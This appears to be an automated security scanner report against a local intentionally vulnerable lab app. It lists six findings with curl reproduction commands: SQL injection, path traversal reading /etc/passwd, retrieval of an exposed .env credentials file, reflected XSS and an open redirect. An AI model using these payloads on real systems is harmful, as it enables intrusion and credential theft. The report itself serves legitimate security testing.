# REVENANT Security Assessment Report

**Target:** `http://127.0.0.1:3000`  
**Campaign ID:** `3636b656-71bd-4270-a005-9d85c8036fb5`  
**Date:** 2026-09-17T12:17:14.201882+00:00  
**Total Discovered Assets:** 1  
**Total Findings:** 6  

---

## Executive Summary

REVENANT completed an automated security assessment against `http://127.0.0.1:3000`.

| Severity | Count |
|:---|:---:|
| 🔴 CRITICAL | 2 |
| 🟠 HIGH | 2 |
| 🟡 MEDIUM | 1 |
| 🔵 LOW | 0 |
| ⚪ INFO | 1 |

---

## Discovered Assets (1)

- **http://127.0.0.1:3000** (127.0.0.1)
  - Ports: 3000/tcp (http)
  - Endpoints (7):
    - `http://127.0.0.1:3000` [200]
    - `http://127.0.0.1:3000/search` [N/A]
    - `http://127.0.0.1:3000/login` [N/A]
    - `http://127.0.0.1:3000/view?file=intro.txt` [200]
    - `http://127.0.0.1:3000/rest/user/login` [200]
    - *...and 2 more*

---

## Detailed Findings

### 1. [CRITICAL] Error-Based SQL Injection in Parameter 'username' (CWE-89)
- **Target / Endpoint:** `http://127.0.0.1:3000/login?username=`
- **Tool:** `dast-fuzzer` | CVSS: 9.3
- **Description:** Active DAST probe provoked database error message 'sqlite3.operationalerror' using SQL quote injection on parameter 'username'.
- **Reproduction:**
  ```bash
  curl -s "http://127.0.0.1:3000/login?username=%27%20OR%20%271%27%3D%271"
  ```
- **Evidence:**
  ```text
  Database syntax error detected: 'sqlite3.operationalerror'
  ```

### 2. [CRITICAL] Path Traversal in Parameter 'file' (CWE-22)
- **Target / Endpoint:** `http://127.0.0.1:3000/view?file=intro.txt?file=`
- **Tool:** `dast-fuzzer` | CVSS: 8.6
- **Description:** Active DAST probe read arbitrary system files via directory traversal in parameter 'file'.
- **Reproduction:**
  ```bash
  curl -s "http://127.0.0.1:3000/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
  ```
- **Evidence:**
  ```text
  System file signature 'root:' detected in response body.
  ```

### 3. [HIGH] Generic Env File Disclosure (cwe-552)
- **Target / Endpoint:** `http://127.0.0.1:3000/.env`
- **Tool:** `nuclei` | CVSS: 8.3
- **Description:** A .env file was discovered containing sensitive information like database credentials and tokens. It should not be publicly accessible.

- **Reproduction:**
  ```bash
  curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://127.0.0.1:3000/.env'
  ```
- **Evidence:**
  ```text
  Reproduction:
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://127.0.0.1:3000/.env'
  ```

### 4. [HIGH] Reflected Cross-Site Scripting (XSS) in Parameter 'query' (CWE-79)
- **Target / Endpoint:** `http://127.0.0.1:3000/search?query=`
- **Tool:** `dast-fuzzer` | CVSS: 7.1
- **Description:** Active DAST injection identified unescaped reflection of script payload in parameter 'query' on endpoint 'http://127.0.0.1:3000/search'.
- **Reproduction:**
  ```bash
  curl -s "http://127.0.0.1:3000/search?query=rev%3Cscript%3Ealert%28%27xss_query%27%29%3C/script%3Erev"
  ```
- **Evidence:**
  ```text
  Reflected payload detected in HTTP response body:
rev<script>alert('xss_query')</script>rev
  ```

### 5. [MEDIUM] Open Redirection in Parameter 'next' (CWE-601)
- **Target / Endpoint:** `http://127.0.0.1:3000/redirect?next=/dashboard?next=`
- **Tool:** `dast-fuzzer` | CVSS: 6.1
- **Description:** Active DAST probe confirmed unvalidated redirect to external arbitrary domain via parameter 'next'.
- **Reproduction:**
  ```bash
  curl -i -s "http://127.0.0.1:3000/redirect?next=https%3A%2F%2Frevenant.security.test"
  ```
- **Evidence:**
  ```text
  HTTP 302 Redirect with Location: https://revenant.security.test
  ```

### 6. [INFO] Technologies Detected on http://127.0.0.1:3000
- **Target / Endpoint:** `http://127.0.0.1:3000`
- **Tool:** `httpx`
- **Description:** HTTP probing fingerprinted technologies: Python:3.14.7, BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2
- **Evidence:**
  ```text
  Status: 200, Title: 'OWASP Juice Shop / crAPI Lab', Tech: ['Python:3.14.7', 'BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2']
  ```
